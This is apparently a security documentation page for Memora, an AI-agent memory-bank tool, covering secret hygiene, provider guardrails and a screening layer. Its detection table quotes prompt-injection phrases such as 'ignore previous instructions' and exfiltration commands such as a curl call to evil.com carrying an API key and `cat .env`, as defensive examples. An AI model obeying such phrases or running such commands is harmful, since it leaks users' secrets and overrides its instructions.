# 🔒 Security

**Purpose:** Explain Memora’s approach to memory hygiene, privacy awareness, and safe operating practices.  
**Audience:** Users, maintainers, security-conscious teams.  
**Read when:** You want to understand how Memora helps keep project memory clean and safe.  
**Last updated:** 2026-04-16

**See also:** [Patterns](./PATTERNS.md) · [Validation](./VALIDATION.md) · [Runtime Layer](./RUNTIME.md) · [Manifesto](./MANIFESTO.md) · [INDEX.md](./INDEX.md)

---

## 📖 Table of Contents

- [Security posture](#-security-posture)
- [What should never be stored](#-what-should-never-be-stored)
- [Why memory hygiene matters](#-why-memory-hygiene-matters)
- [Practical safeguards already included](#-practical-safeguards-already-included)
- [Runtime security screening](#-runtime-security-screening)
- [Provider guardrail enforcement](#-provider-guardrail-enforcement)
- [Privacy zones](#-privacy-zones)
- [Safe operating practices](#-safe-operating-practices)
- [Why Memora’s security approach is useful](#-why-memoras-security-approach-is-useful)
- [Recommended checklist](#-recommended-checklist)
- [Navigation](#-navigation)

---

## 🎯 Security posture

Memora is designed with **memory hygiene** in mind.

That means the project encourages teams to treat memory-bank files as structured project assets that should remain:

- useful,
- reviewable,
- safe,
- free from sensitive spillover.

This is one of Memora’s important practical strengths.

---

## 🚫 What should never be stored

As a working rule, do not store the following in project memory:

- API keys,
- access tokens,
- passwords,
- private credentials,
- raw secrets,
- sensitive personal data.

Memora’s structure and guidance are designed to support that discipline.

---

## 🧼 Why memory hygiene matters

Project memory can easily become a dangerous dumping ground if teams blur the boundary between:

- stable knowledge,
- active session notes,
- private or secret material.

Memora helps avoid that by:

- isolating session state in `.local/`,
- encouraging canonical ownership of stable knowledge,
- providing privacy-oriented pattern guidance,
- supporting maintenance workflows and reviewable memory structure.

---

## ✅ Practical safeguards already included

Memora already includes several useful memory-hygiene elements:

### 1. Entry-point guidance in `AGENTS.md`
The main agent entry file establishes secret-aware operating expectations.

### 2. Privacy-aware pattern guidance
The included privacy-control pattern gives teams a reusable model for handling sensitive or ephemeral content.

### 3. Local-state isolation
The `.local/` layer gives a dedicated place for current working context and short-lived session material.

### 4. Hook and audit-oriented workflow structure
The repository includes maintenance workflows and deterministic advisory hooks that help keep memory visible and manageable over time.

### 5. Ignore-oriented local setup
The initialization flow helps reinforce that local and sensitive session-state should stay separate from stable memory.

---

## 🔒 Runtime security screening

Memora includes a **programmatic security layer** (`lib/runtime/`) that enforces at code level the rules described in this document.

The runtime layer provides two screening functions:

### Memory write screening (`checkMemoryWrite`)

Before any content is persisted to a memory file, it is scanned for:

| Category | Examples |
|---|---|
| Prompt injection | "ignore previous instructions", "you are now", "disregard your guidelines" |
| Exfiltration | `curl https://evil.com?k=$API_KEY`, `wget ... $TOKEN`, `cat .env` |
| SSH persistence | `authorized_keys` references, `~/.ssh` paths |
| Invisible Unicode | Zero-width spaces (U+200B), directional overrides (U+202E), BOM (U+FEFF) |

Memory files are prompt-adjacent: they are injected into the system prompt on future sessions. Blocking dangerous content here prevents injection and exfiltration payloads from persisting across sessions.

### Context file screening (`loadContextFile`)

Before a context file (`AGENTS.md`, `CLAUDE.md`, `.hermes.md`, `.cursorrules`, etc.) is injected into the prompt, it is scanned for:

- All memory write threats (above), plus:
- HTML comment injection (`<!-- ... override ... -->`)
- Hidden `<div>` content injection (`display:none`)
- Translate-and-execute patterns

If a threat is detected, the function returns a **safe `[BLOCKED: ...]` placeholder** instead of the original content. The caller can inject the placeholder — the agent sees a clear block notice rather than silently missing context.

### When screening is applied

The runtime layer does not intercept file writes automatically. It is an **opt-in gate** — memory-restore, update-memory, and agent code must call `runtime.checkMemoryWrite()` and `runtime.loadContextFile()` explicitly.

See [Runtime Layer](./RUNTIME.md) for the full API reference and threat pattern catalog.

---

## 🛡️ Provider guardrail enforcement

Memora's security controls differ by provider. Understanding this prevents the false assumption that all toolchains offer equivalent protection.

### Baseline patterns

The following file patterns constitute the canonical secret-protection baseline. All providers should treat these as sensitive:

| Pattern | What it covers |
|---|---|
| `.env`, `.env.*` | Environment variable files |
| `*.key` | Private key files |
| `*.pem` | PEM-encoded certificates and keys |
| `*.p12` | PKCS#12 certificate bundles |
| `*credentials*` | Files with "credentials" in the name |
| `*secret*` | Files with "secret" in the name |

### Enforcement levels by provider

| Provider | Enforcement level | Mechanism | Config files |
|---|---|---|---|
| **Claude Code** | **Hard** | `permissions.deny` + `.claudeignore` + security rules | `.claude/settings.json`, `.claudeignore`, `.claude/rules/security.md` |
| **Qwen Code** | Partial | `.qwen/settings.qwenignore` file-exclusion rules | `.qwen/settings.qwenignore` |
| **Codex CLI** | Advisory only | No native deny/ignore config | — |
| **OpenCode** | Advisory only | No native deny/ignore config | — |

### What "advisory only" means in practice

For providers without hard enforcement (Codex, OpenCode), security protection relies on:

1. **Workflow guidance** — memory-audit and other workflows include secret-scanning steps.
2. **`AGENTS.md`** — the agent entry point establishes security operating expectations.
3. **`memory-bank/POLICIES/`** — project-level data handling policies.
4. **`.gitignore`** — excludes sensitive files from version control.
5. **Pre-commit hooks** — `.githooks/pre-commit` can catch secrets before they land in commits.

> **Rule:** Claude Code safeguards must not be weakened for the sake of cross-provider uniformity. Parity is achieved by strengthening other providers or documenting explicit limitations — never by degrading stronger controls.

---

## 🔐 Privacy zones

Memora includes a privacy-control pattern that gives teams a consistent vocabulary for handling memory sensitivity.

This matters because some information should be:

- excluded entirely,
- kept local,
- promoted carefully,
- clearly distinguished from stable reusable knowledge.

Use the privacy pattern as the main guidance surface for safe memory handling.

---

## 💡 Safe operating practices

### Keep secrets out of memory files
Even if the memory-bank is convenient, it is not a place for secret values.

### Prefer references over secret material
When sensitive configuration must be mentioned, prefer environment-variable names or secure references instead of raw values.

### Keep active state separate from durable knowledge
Use `.local/` for session context and keep canonical files focused on stable, reusable project memory.

### Review promoted knowledge
Before durable promotion, ask whether the information is:
- stable,
- safe,
- useful beyond one session,
- appropriate for a shared project memory-bank.

---

## ✨ Why Memora’s security approach is useful

Memora’s strength is not that it tries to become a security appliance. Its strength is that it makes safer memory behavior easier to follow through:

- structure reduces accidental sprawl,
- separation reduces cross-contamination,
- workflows make maintenance more visible,
- patterns provide a reusable safety vocabulary.

That makes the repository friendlier for teams that care about long-lived AI-assisted engineering work without sacrificing memory hygiene.

---

## ✓ Recommended checklist

Use this checklist when maintaining a project memory-bank:

- [ ] no API keys or tokens in memory files
- [ ] no passwords or private credentials in memory files
- [ ] active work lives in `.local/`
- [ ] durable files contain only stable, shareable knowledge
- [ ] privacy-sensitive material follows project safety guidance
- [ ] validation and maintenance workflows are used regularly
- [ ] memory writes pass through `runtime.checkMemoryWrite()` before persistence
- [ ] context files pass through `runtime.loadContextFile()` before injection

---

## 📚 Related reading

- [Runtime Layer](./RUNTIME.md)
- [Patterns](./PATTERNS.md)
- [Validation](./VALIDATION.md)
- [Workflows](./WORKFLOWS.md)
- [Manifesto](./MANIFESTO.md)

---

## 🧭 Navigation

| Link | Destination |
|------|-------------|
| ← Back | [PATTERNS.md](./PATTERNS.md) |
| Next → | [MANIFESTO.md](./MANIFESTO.md) |

**Other sections:** [INDEX.md](./INDEX.md) · [memory-bank/](../memory-bank/INDEX.md) · [HOME](../README.md)
